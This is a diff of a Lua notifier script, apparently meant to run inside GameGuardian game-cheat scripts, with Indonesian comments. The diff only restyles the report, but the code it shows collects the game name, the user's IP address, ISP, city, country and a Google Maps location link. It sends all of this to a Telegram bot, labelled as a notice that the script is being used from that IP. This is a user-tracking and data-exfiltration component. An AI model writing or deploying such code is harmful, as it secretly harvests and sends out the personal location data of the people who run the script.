@@ -2,14 +2,13 @@
 local BOT_TOKEN = "YOUR_BOT_TOKEN_HERE"
 local CHAT_ID = "YOUR_CHAT_ID_HERE"
 
--- [[ JULES-CORE MODERN NOTIFIER ]]
--- Fitur: IP Tracking, Geolocation, Game Detection, Time/Date
+-- [[ JULES-CORE CLEAN NOTIFIER ]]
+-- Fitur: IP Tracking, Geolocation, Game Detection, Time/Date (No ASCII Box)
 
 local function get_session_info()
     local gameName = "Unknown Game"
     local package = "Unknown Package"
 
-    -- Menggunakan pcall untuk mencegah crash jika fungsi tidak tersedia
     local status, info = pcall(gg.getTargetInfo)
     if status and info then
         gameName = info.label or gameName
@@ -58,26 +57,24 @@ local function send_report()
 
     local maps_link = "https://www.google.com/maps?q=" .. (loc and loc.lat or "0") .. "," .. (loc and loc.lon or "0")
 
-    -- Design modern dengan ASCII Art Box dan format HTML
-    local message = "<b>🚀 [ JULES-CORE SYSTEM INTEGRATION ]</b>\n" ..
-                    "<code>" ..
-                    "╔════════════════════════════════════╗\n" ..
-                    "║        SYSTEM STATUS: ONLINE       ║\n" ..
-                    "╠════════════════════════════════════╣\n" ..
-                    "║ DATE: " .. date .. " | TIME: " .. time .. " ║\n" ..
-                    "╠════════════════════════════════════╣\n" ..
-                    "║ > SESSION INFORMATION              ║\n" ..
-                    "║ GAME    : " .. session.game .. "\n" ..
-                    "║ PACKAGE : " .. session.package .. "\n" ..
-                    "╠════════════════════════════════════╣\n" ..
-                    "║ > NETWORK & LOCATION               ║\n" ..
-                    "║ IP      : " .. (loc and loc.ip or "Unknown") .. "\n" ..
-                    "║ ISP     : " .. (loc and loc.isp or "Unknown") .. "\n" ..
-                    "║ CITY    : " .. (loc and loc.city or "Unknown") .. "\n" ..
-                    "║ COUNTRY : " .. (loc and loc.country or "Unknown") .. "\n" ..
-                    "╚════════════════════════════════════╝</code>\n\n" ..
-                    "📍 <b>Location Tracking:</b>\n" ..
-                    "└ <a href=\"" .. maps_link .. "\">Open in Google Maps</a>\n\n" ..
+    -- Design modern minimalis (Tanpa ASCII box agar tidak berantakan di HP)
+    local line = "━━━━━━━━━━━━━━━━━━━━"
+
+    local message = "🚀 <b>[ JULES-CORE SYSTEM REPORT ]</b>\n" ..
+                    line .. "\n" ..
+                    "<b>📅 TANGGAL :</b> <code>" .. date .. "</code>\n" ..
+                    "<b>⏰ WAKTU   :</b> <code>" .. time .. "</code>\n" ..
+                    "<b>📊 STATUS  :</b> <code>ACTIVE</code>\n" ..
+                    line .. "\n" ..
+                    "<b>🎮 GAME    :</b> <code>" .. session.game .. "</code>\n" ..
+                    "<b>📦 PACKAGE :</b> <code>" .. session.package .. "</code>\n" ..
+                    line .. "\n" ..
+                    "<b>🌐 IP ADDR :</b> <code>" .. (loc and loc.ip or "Unknown") .. "</code>\n" ..
+                    "<b>🏢 ISP     :</b> <code>" .. (loc and loc.isp or "Unknown") .. "</code>\n" ..
+                    "<b>🏙️ KOTA    :</b> <code>" .. (loc and loc.city or "Unknown") .. "</code>\n" ..
+                    "<b>🇮🇩 NEGARA  :</b> <code>" .. (loc and loc.country or "Unknown") .. "</code>\n" ..
+                    line .. "\n" ..
+                    "📍 <a href=\"" .. maps_link .. "\"><b>Lihat di Google Maps</b></a>\n\n" ..
                     "<i>notifikasi script di gunakan oleh IP ini</i>"
 
     local tgUrl = "https://api.telegram.org/bot" .. BOT_TOKEN .. "/sendMessage"
